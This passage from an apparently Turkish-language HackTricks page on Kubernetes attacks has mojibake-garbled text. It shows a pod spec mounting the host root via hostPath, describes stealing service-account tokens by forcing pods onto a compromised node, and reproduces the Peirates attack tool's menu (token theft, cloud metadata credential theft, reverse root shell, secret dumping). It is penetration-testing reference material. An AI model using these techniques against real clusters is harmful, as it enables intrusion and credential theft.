volumes:
- name: host
hostPath:
path: /
type: Directory
```
### PodlarÄ± Silme + Planlanamayan DÃ¼ÄŸÃ¼mler

Bir saldÄ±rgan bir dÃ¼ÄŸÃ¼mÃ¼ **ele geÃ§irdiyse** ve diÄŸer dÃ¼ÄŸÃ¼mlerden **podlarÄ± silebilir** ve diÄŸer dÃ¼ÄŸÃ¼mlerin **podlarÄ± Ã§alÄ±ÅŸtÄ±ramaz hale getirebilirse**, podlar ele geÃ§irilmiÅŸ dÃ¼ÄŸÃ¼mde yeniden Ã§alÄ±ÅŸtÄ±rÄ±lacak ve saldÄ±rgan bu podlarda Ã§alÄ±ÅŸan **jetonlarÄ± Ã§alabilecektir**.\
Daha fazla bilgi iÃ§in [**bu baÄŸlantÄ±larÄ± takip edin**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes).

## Otomatik AraÃ§lar

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

<details>

<summary><strong>AWS hackleme becerilerini sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenmek iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek isterseniz** [**ABONELÄ°K PLANLARINA**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**'u takip edin**.
* **Hacking hilelerinizi HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github depolarÄ±na PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
